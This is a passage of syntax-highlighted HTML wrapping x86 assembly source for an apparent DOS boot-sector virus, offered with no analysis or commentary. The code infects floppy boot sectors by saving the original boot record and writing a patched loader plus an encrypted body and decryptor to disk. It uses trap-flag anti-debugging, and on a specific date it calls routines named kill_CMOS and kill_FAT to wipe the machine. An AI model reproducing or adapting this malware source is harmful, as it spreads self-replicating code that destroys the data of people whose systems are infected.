</span><span class="sc5">set_iret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc5">sub1</span><span class="sc4">],</span><span class="sc2">0cfh</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc5">sub1</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc2">26ebh</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_int01</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres21hCS</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres21hCS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc0">  </span><span class="sc1">;shr bx,4</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">baseMCBCS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">Exit_int01</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_iret</span><span class="sc0">
</span><span class="sc5">Exit_int01</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">Infect_FDD</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">AccDen</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_FDD_Param</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0"> </span><span class="sc1">; Увел. цилиндр</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
</span><span class="sc5">makeTab2FDD</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0"> </span><span class="sc1">;cil</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0"> </span><span class="sc1">;head</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;nomsec</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">;size</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">makeTab2FDD</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc0"> </span><span class="sc1">; count of sectors on fdd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;drive</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">;sec</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">             </span><span class="sc1">; save old Boot</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc1">; patch boot</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">03cebh</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">new_bootFDD</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_new_bootFDD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_bootFDD</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc1">; save new boot 2 -&gt; 0 0 1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc1">;---------</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Make_Cript_Bady</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0309h</span><span class="sc0">             </span><span class="sc1">; save 2 FDD Cript BAdy</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0">   </span><span class="sc5">DecripterBOOT</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calling13h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ProcSetTF_1</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">PUSHF</span><span class="sc0">
                   </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
                   </span><span class="sc6">OR</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
                   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                   </span><span class="sc6">POPF</span><span class="sc0">
                   </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">ProcSetTF_0</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">PUSHF</span><span class="sc0">
                   </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
                   </span><span class="sc6">AND</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FEFFh</span><span class="sc0">
                   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                   </span><span class="sc6">POPF</span><span class="sc0">
                   </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">; new bootFDD</span><span class="sc0">
  </span><span class="sc5">new_bootFDD</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Memlimit</span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
     </span><span class="sc1">;LOAD BADY</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">  </span><span class="sc1">; cil</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0209h</span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;----------</span><span class="sc0">
     </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;load decriptor</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; decriptor</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0FDDh</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">End_new_bootFDD</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">randomaze</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mov_es_0000h</span><span class="sc0">
   </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
   </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">46ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; --------------------</span><span class="sc0">
</span><span class="sc5">RandSeed</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">ww</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">8405h</span><span class="sc0">
</span><span class="sc1">; Random</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ww</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">0002</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc5">delay</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffh</span><span class="sc0">
</span><span class="sc5">e1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">e1</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">LOGO</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pusha</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1207h</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">note</span><span class="sc0">
</span><span class="sc1">;---EEEE----------------</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">kill_CMOS</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">kill_FAT</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0013h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0909h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1300h</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mesb</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">mese</span><span class="sc4">-</span><span class="sc5">mesb</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
